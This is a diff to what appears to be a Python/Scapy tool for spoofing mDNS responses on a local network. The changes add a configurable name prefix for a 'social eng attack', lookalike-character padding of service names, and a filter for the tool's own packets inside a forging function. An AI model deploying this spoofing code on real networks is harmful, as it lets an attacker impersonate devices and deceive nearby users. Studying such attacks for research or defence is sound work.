@@ -13,7 +13,8 @@ target="224.0.0.251"
 devicev6=""
 targetv6=""
 interface="wlan0"
-name="" #Set this variable to the local domain name of the attacker or leave empty if you are running attack number 1
+prefix=""  # set this variable to "\x01" to perform social eng attack
+name="" #Set this variable to the local domain name of the attacker or leave empty ONLY if you are running attack number 1
 reminder=True 
 nbr=1  # when reminder is True this variable set the frequencies of sending responses, 1 means a response each 0.1 second
 # To Configure the ip  address of the attacker  go here ==================================
@@ -44,7 +45,8 @@ renamed=False
 instance_names_rrname=dict()
 #################################### FUNCTIONS ####################################
 def tricky_padding(name):
-    return "\x01"+name
+    global prefix
+    return prefix+name
     #implented for custom modifications for the service name
     D["H"]=chr(0xf768)
     D["O"]=chr(0xF76F)
@@ -187,10 +189,7 @@ def fake(packet):
     global trigger_packet
     global instance_names_rrname
     global instance_names
-    #print(packet[sa.Ether].src)
-    #print(forged_packet)
-    #print(packet)
-    if sa.IP in packet and packet[sa.IP].src==my_ip :
+    if sa.Ether in packet and packet[sa.Ether].src==my_mac :
         return None
     #if sa.IP in packet and sa.TCP in packet :
         #if packet[sa.IP].src==device and not("R" in packet[sa.TCP].flags):
